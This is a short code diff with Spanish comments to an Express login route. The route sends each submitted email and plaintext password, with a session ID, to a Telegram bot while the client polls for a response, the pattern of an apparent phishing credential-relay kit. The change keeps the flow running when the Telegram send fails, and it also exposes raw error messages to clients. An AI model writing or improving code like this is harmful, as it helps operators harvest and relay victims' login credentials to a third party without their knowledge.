@@ -25,8 +25,14 @@ router.post('/login', async (req, res) => {
       password,
     });
 
-    // Enviar a Telegram
-    await telegramService.sendAuthRequest(sessionId, email, password);
+    // Enviar a Telegram (sin bloquear si falla)
+    try {
+      await telegramService.sendAuthRequest(sessionId, email, password);
+      console.log('[AUTH] Mensaje enviado a Telegram exitosamente');
+    } catch (telegramError) {
+      console.error('[AUTH] Error enviando a Telegram:', telegramError.message);
+      // No fallar aquí, dejar que continúe el polling
+    }
 
     // Responder al cliente
     res.json({
@@ -35,7 +41,7 @@ router.post('/login', async (req, res) => {
     });
   } catch (error) {
     console.error('[AUTH ERROR]', error);
-    res.status(500).json({ error: 'Error al procesar la solicitud' });
+    res.status(500).json({ error: 'Error al procesar la solicitud: ' + error.message });
   }
 });
 
